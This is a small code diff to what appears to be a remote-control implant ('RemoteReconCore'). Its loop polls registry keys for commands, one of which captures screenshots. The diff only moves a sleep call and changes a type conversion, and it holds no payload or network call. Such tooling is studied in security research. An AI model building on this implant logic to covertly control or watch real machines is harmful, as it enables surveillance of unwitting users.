@@ -40,6 +40,7 @@ namespace RemoteReconCore
             while (rrbase.GetValue(runkey) != null)
             {
                 //main loop
+                Thread.Sleep((sleep * 1000));
                 int cmd;
                 if ((cmd = (int)rrbase.GetValue(commandkey)) == 0)
                     continue; /*Continue if no cmd*/
@@ -74,8 +75,6 @@ namespace RemoteReconCore
                     default:
                         break;
                 }
-
-                Thread.Sleep((sleep * 1000));
             }
         }
 
@@ -94,7 +93,7 @@ namespace RemoteReconCore
 #if DEBUG 
                 Console.WriteLine("Received Screenshot command");
 #endif
-                GetScreenShot((int)command.Value);
+                GetScreenShot(Convert.ToInt32(command.Value));
             }
         }
 
